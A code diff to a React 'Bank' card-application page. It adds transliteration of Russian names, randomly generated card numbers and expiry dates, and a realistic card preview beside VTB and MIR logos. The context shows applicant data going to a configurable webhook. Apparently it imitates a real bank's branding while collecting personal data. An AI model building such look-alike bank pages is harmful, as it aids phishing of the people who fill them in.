@@ -19,6 +19,58 @@ const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';
 
 type Step = 'form' | 'success';
 
+// Таблица транслитерации русских букв в латинские
+const translitMap: { [key: string]: string } = {
+  'а': 'a', 'б': 'b', 'в': 'v', 'г': 'g', 'д': 'd', 'е': 'e', 'ё': 'e',
+  'ж': 'zh', 'з': 'z', 'и': 'i', 'й': 'y', 'к': 'k', 'л': 'l', 'м': 'm',
+  'н': 'n', 'о': 'o', 'п': 'p', 'р': 'r', 'с': 's', 'т': 't', 'у': 'u',
+  'ф': 'f', 'х': 'kh', 'ц': 'ts', 'ч': 'ch', 'ш': 'sh', 'щ': 'shch',
+  'ъ': '', 'ы': 'y', 'ь': '', 'э': 'e', 'ю': 'yu', 'я': 'ya',
+  'А': 'A', 'Б': 'B', 'В': 'V', 'Г': 'G', 'Д': 'D', 'Е': 'E', 'Ё': 'E',
+  'Ж': 'ZH', 'З': 'Z', 'И': 'I', 'Й': 'Y', 'К': 'K', 'Л': 'L', 'М': 'M',
+  'Н': 'N', 'О': 'O', 'П': 'P', 'Р': 'R', 'С': 'S', 'Т': 'T', 'У': 'U',
+  'Ф': 'F', 'Х': 'KH', 'Ц': 'TS', 'Ч': 'CH', 'Ш': 'SH', 'Щ': 'SHCH',
+  'Ъ': '', 'Ы': 'Y', 'Ь': '', 'Э': 'E', 'Ю': 'YU', 'Я': 'YA',
+  ' ': ' '
+};
+
+// Функция транслитерации
+const transliterate = (text: string): string => {
+  return text
+    .split('')
+    .map(char => translitMap[char] || char)
+    .join('')
+    .toUpperCase();
+};
+
+// Функция для получения Имени и Фамилии из ФИО
+const getCardHolderName = (fullName: string): string => {
+  const parts = fullName.trim().split(/\s+/);
+  if (parts.length === 0) return '';
+  if (parts.length === 1) return transliterate(parts[0]);
+  // Формат: ИМЯ ФАМИЛИЯ (второе слово - имя, первое - фамилия)
+  const surname = parts[0]; // Фамилия
+  const name = parts[1]; // Имя
+  return transliterate(`${name} ${surname}`);
+};
+
+// Генерация номера карты
+const generateCardNumber = (): string => {
+  const groups = [];
+  for (let i = 0; i < 4; i++) {
+    groups.push(String(Math.floor(1000 + Math.random() * 9000)));
+  }
+  return groups.join(' ');
+};
+
+// Генерация даты истечения срока (текущий месяц + 5 лет)
+const generateExpiryDate = (): string => {
+  const now = new Date();
+  const month = String(now.getMonth() + 1).padStart(2, '0');
+  const year = String((now.getFullYear() + 5) % 100).padStart(2, '0');
+  return `${month}/${year}`;
+};
+
 const Bank = () => {
   const { toast } = useToast();
   const [isLoading, setIsLoading] = useState(false);
@@ -33,6 +85,10 @@ const Bank = () => {
     birthDate: '',
     agreeTerms: false,
   });
+
+  // Генерируем номер карты и дату один раз при загрузке
+  const [cardNumber] = useState(() => generateCardNumber());
+  const [expiryDate] = useState(() => generateExpiryDate());
 
   useEffect(() => {
     const savedUrl = localStorage.getItem(WEBHOOK_STORAGE_KEY) || DEFAULT_WEBHOOK_URL;
@@ -442,6 +498,12 @@ const Bank = () => {
                   {/* Blue gradient background */}
                   <div className="absolute inset-0 bg-gradient-to-br from-[#42A5F5] via-[#1E88E5] to-[#1565C0]" />
 
+                  {/* Декоративные элементы */}
+                  <div className="absolute inset-0 overflow-hidden">
+                    <div className="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-xl" />
+                    <div className="absolute -left-10 -bottom-10 w-32 h-32 bg-white/5 rounded-full blur-lg" />
+                  </div>
+
                   {/* VTB Logo - top right */}
                   <div className="absolute top-5 right-5">
                     <svg width="60" height="24" viewBox="0 0 60 24" fill="none">
@@ -454,9 +516,41 @@ const Bank = () => {
                     </svg>
                   </div>
 
+                  {/* Chip */}
+                  <div className="absolute top-5 left-5">
+                    <div className="w-12 h-9 rounded-md bg-gradient-to-br from-[#FFD700] via-[#FFC107] to-[#FF9800] shadow-inner flex items-center justify-center">
+                      <div className="w-8 h-6 border border-[#B8860B]/40 rounded-sm grid grid-cols-3 grid-rows-2 gap-px p-0.5">
+                        {[...Array(6)].map((_, i) => (
+                          <div key={i} className="bg-[#B8860B]/30 rounded-[1px]" />
+                        ))}
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Card Number */}
+                  <div className="absolute top-[45%] left-5 right-5 transform -translate-y-1/2">
+                    <p className="text-white text-xl md:text-2xl font-mono tracking-[0.2em] drop-shadow-md">
+                      {cardNumber}
+                    </p>
+                  </div>
+
+                  {/* Expiry Date & Card Holder */}
+                  <div className="absolute bottom-12 left-5 right-5 flex justify-between items-end">
+                    <div className="flex-1 min-w-0">
+                      <p className="text-white/60 text-[10px] uppercase tracking-wider mb-0.5">Card Holder</p>
+                      <p className="text-white text-sm font-medium tracking-wide truncate drop-shadow-sm transition-all duration-300">
+                        {formData.fullName ? getCardHolderName(formData.fullName) : 'YOUR NAME'}
+                      </p>
+                    </div>
+                    <div className="ml-4 text-right">
+                      <p className="text-white/60 text-[10px] uppercase tracking-wider mb-0.5">Valid Thru</p>
+                      <p className="text-white text-sm font-medium font-mono drop-shadow-sm">{expiryDate}</p>
+                    </div>
+                  </div>
+
                   {/* MIR Logo - bottom left */}
-                  <div className="absolute bottom-5 left-5">
-                    <svg width="70" height="28" viewBox="0 0 70 28" fill="none">
+                  <div className="absolute bottom-3 left-5">
+                    <svg width="50" height="20" viewBox="0 0 70 28" fill="none">
                       {/* MIR logo background shape */}
                       <rect x="0" y="4" width="70" height="20" rx="4" fill="url(#mirGradient)"/>
                       {/* МИР text */}
